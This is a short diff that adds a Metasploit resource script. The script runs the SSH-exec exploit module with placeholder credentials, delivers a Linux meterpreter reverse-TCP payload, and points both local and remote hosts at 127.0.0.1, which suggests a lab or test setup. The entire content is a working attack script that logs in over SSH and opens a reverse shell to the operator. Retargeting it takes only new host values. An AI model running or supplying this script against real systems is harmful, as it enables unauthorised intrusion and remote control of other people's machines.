@@ -1,0 +1,7 @@
+use exploit/multi/ssh/sshexec
+set USERNAME user
+set PASSWORD password
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set RHOST 127.0.0.1
+exploit
